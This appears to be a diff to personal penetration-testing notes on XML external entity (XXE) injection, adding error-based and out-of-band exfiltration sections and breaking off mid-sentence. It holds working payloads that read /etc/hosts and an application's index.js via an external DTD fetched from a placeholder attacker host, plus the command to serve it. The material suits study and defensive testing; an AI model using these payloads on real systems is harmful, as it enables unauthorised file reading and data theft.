@@ -106,14 +106,14 @@ As XML won't join *Internal* & *External* entities together, we need to use *XML
 Ideally, we can store this data on our web server and reference it as external. We could store `xxe.dtd` and host a simple web server, then we could submit the XXE payload with the `CDATA` wrapper:
 ```bash
 echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
-python -m http.server 8080
+python -m http.server 8000
 ```
 ```xml
 <!DOCTYPE email [
 	<!ENTITY % begin "<![CDATA[">
 	<!ENTITY % file SYSTEM "file:///var/www/html/index.js">
 	<!ENTITY % end "]]>">
-	<!ENTITY % xxe SYSTEM "http://ATK_IP:8080/xxe.dtd">
+	<!ENTITY % xxe SYSTEM "http://ATK_IP:8000/xxe.dtd">
 	%xxe;
 ]>
 ...
@@ -122,4 +122,22 @@ python -m http.server 8080
 > Due to file/entity self-referencing, the web server may prevent us from referencing some files (eg. *index*)
 
 ### Error-based XXE
-If errors are exposed on the application then we may be able to extract data via these. We may be blind to the actual XML output but we can still use the errors as a medium.
+If errors are exposed on the application then we may be able to extract data via these. We may be blind to the actual XML output but we can still use the errors as a medium. First, we need to work out how to trigger these errors, eg. delete the `</root>` tag or reference a non-existing entity. Like we did above with hosting the DTD ourselves, we can host a file like:
+```xml
+<!ENTITY % file SYSTEM "file:///etc/hosts">
+<!ENTITY % error "<!ENTITY content SYSTEM '%fakeEntity;/%file;'>">
+```
+We can then reference this in out payload:
+```xml
+<!DOCTYPE email [
+	<!ENTITY % remote SYSTEM "http://ATK_IP:8000/xxe.dtd"
+	%remote;
+	%error;
+]>
+```
+> This could be used to read files that have XML characters but its less reliable than above.
+
+### Out-of-band Data Exfiltration
+When dealing with blind injections (*which in this day is pretty common*), we can utilise *Out-of-band (OOB) data exfiltration*. This is a common technique for many injections (SQLi, XXE, Command injection etc). The idea is that we encode the data, then attempt to make a request to our attack web server containing the encoded data:
+
+We can setup a quick 
